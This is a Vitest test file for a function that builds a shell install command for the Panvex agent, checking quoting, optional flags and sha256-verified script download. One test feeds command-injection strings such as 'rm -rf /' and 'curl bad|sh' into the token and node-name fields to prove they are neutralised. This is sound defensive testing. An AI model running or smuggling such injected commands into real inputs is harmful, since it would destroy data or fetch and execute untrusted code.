import { describe, expect, it } from "vitest";
import { buildInstallCommand } from "./install-command";

describe("buildInstallCommand", () => {
  it("quotes every interpolated value", () => {
    const cmd = buildInstallCommand(
      "https://panel.example.com",
      "tok-123",
      "edge-east-01",
    );
    expect(cmd).toContain("--panel-url 'https://panel.example.com'");
    expect(cmd).toContain("--token 'tok-123'");
    expect(cmd).toContain("--node-name 'edge-east-01'");
  });

  it("neutralizes shell metachars in token and node name", () => {
    // The wizard pre-validates nodeName via isValidNodeName, but the
    // build function still has to be safe in isolation: token comes
    // straight from the backend and could in theory contain quirky
    // bytes; defense-in-depth.
    const cmd = buildInstallCommand(
      "https://panel.example.com",
      "tok'; rm -rf / #",
      "x;curl bad|sh",
    );
    // Single-quoted: nothing inside expands or breaks the argv slot.
    expect(cmd).toContain(String.raw`--token 'tok'\''; rm -rf / #'`);
    expect(cmd).toContain("--node-name 'x;curl bad|sh'");
    // No bare semicolon escapes the quoting.
    expect(cmd).not.toMatch(/--token tok'; rm/);
  });

  it("omits advanced flags when values match defaults", () => {
    const cmd = buildInstallCommand("https://p", "tok", "node", {
      telemtUrl: "http://127.0.0.1:9091",
      telemtMetricsUrl: "http://127.0.0.1:8081",
      telemtAuth: "",
      insecureTransport: false,
    });
    expect(cmd).not.toContain("--telemt-url");
    expect(cmd).not.toContain("--telemt-metrics-url");
    expect(cmd).not.toContain("--telemt-auth");
    expect(cmd).not.toContain("--insecure-transport");
  });

  it("appends and quotes advanced flags when overridden", () => {
    const cmd = buildInstallCommand("https://p", "tok", "node", {
      telemtUrl: "http://10.0.0.5:9091",
      telemtMetricsUrl: "http://10.0.0.5:8081",
      telemtAuth: "user:p@ss'word",
      insecureTransport: true,
    });
    expect(cmd).toContain("--telemt-url 'http://10.0.0.5:9091'");
    expect(cmd).toContain("--telemt-metrics-url 'http://10.0.0.5:8081'");
    // Single quote in the auth string survives the round-trip.
    expect(cmd).toContain(String.raw`--telemt-auth 'user:p@ss'\''word'`);
    expect(cmd).toContain("--insecure-transport");
  });

  // PR-3a: scriptUrl + scriptSha256 parametrisation.

  it("defaults to the upstream GitHub-raw URL when scriptUrl is omitted", () => {
    const cmd = buildInstallCommand("https://p", "tok", "node");
    expect(cmd).toContain(
      "curl -fsSL https://raw.githubusercontent.com/lost-coder/panvex/main/deploy/install-agent.sh",
    );
  });

  it("emits the legacy curl|sudo-bash form when scriptSha256 is null (github source)", () => {
    const cmd = buildInstallCommand(
      "https://p",
      "tok",
      "node",
      undefined,
      "https://raw.githubusercontent.com/forky/panvex/v1.2/deploy/install-agent.sh",
      null,
    );
    expect(cmd).toContain(
      "curl -fsSL https://raw.githubusercontent.com/forky/panvex/v1.2/deploy/install-agent.sh",
    );
    expect(cmd).toContain("| \\\n  sudo bash -s --");
    // No verification step in the legacy form — panel cannot vouch for
    // upstream bytes.
    expect(cmd).not.toContain("sha256sum");
    expect(cmd).not.toContain("PANVEX_INSTALL_SCRIPT_SHA256");
    expect(cmd).not.toContain("mktemp");
  });

  it("emits the verified temp-file form when scriptSha256 is set (panel source)", () => {
    const hash = "a".repeat(64);
    const cmd = buildInstallCommand(
      "https://panel.example.com",
      "tok",
      "node",
      undefined,
      "https://panel.example.com/install-agent.sh",
      hash,
    );
    // Verified form: mktemp → curl -o → sha256sum compare → sudo -E bash.
    expect(cmd).toContain("mktemp /tmp/panvex-install.");
    expect(cmd).toContain(
      "curl -fsSL https://panel.example.com/install-agent.sh -o",
    );
    expect(cmd).toContain("sha256sum < \"$TMP\"");
    // Both the in-shell guard and the env var for the script's own
    // self-check carry the same digest, single-quoted.
    expect(cmd).toContain(`if [ "$ACTUAL" != '${hash}' ]; then`);
    expect(cmd).toContain(`PANVEX_INSTALL_SCRIPT_SHA256='${hash}' bash`);
    // No bare `curl | sudo bash` — the verified form pipes nothing.
    expect(cmd).not.toMatch(/curl [^|]*\| sudo bash/);
  });
});
